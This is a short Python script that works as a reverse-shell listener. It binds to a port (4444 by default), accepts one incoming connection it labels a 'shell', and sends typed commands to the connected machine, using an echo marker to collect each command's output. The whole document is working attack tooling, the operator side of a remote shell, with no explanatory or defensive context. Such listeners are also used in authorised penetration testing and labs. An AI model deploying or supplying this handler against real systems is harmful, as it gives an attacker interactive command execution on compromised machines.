#!/usr/bin/env python3
import socket
import sys

HOST = "0.0.0.0"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
MARKER = "__CMD_DONE__"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((HOST, PORT))
server.listen(1)

print(f"[*] Listening on {HOST}:{PORT} ...")
conn, addr = server.accept()
print(f"[+] Shell from {addr[0]}:{addr[1]}")

def recv_until_marker(conn, marker):
    buf = ""
    while marker not in buf:
        chunk = conn.recv(4096).decode(errors="replace")
        if not chunk:
            break
        buf += chunk
    # Remove marker from output
    return buf.replace(marker, "").replace("\n" + marker, "")

try:
    while True:
        cmd = input("$ ")
        if not cmd.strip():
            continue
        # Send command followed by echo of marker to know when output ends
        full_cmd = f"{cmd}; echo {MARKER}\n"
        conn.sendall(full_cmd.encode())
        output = recv_until_marker(conn, MARKER)
        print(output, end="")
except (KeyboardInterrupt, EOFError):
    print("\n[*] Closing.")
finally:
    conn.close()
    server.close()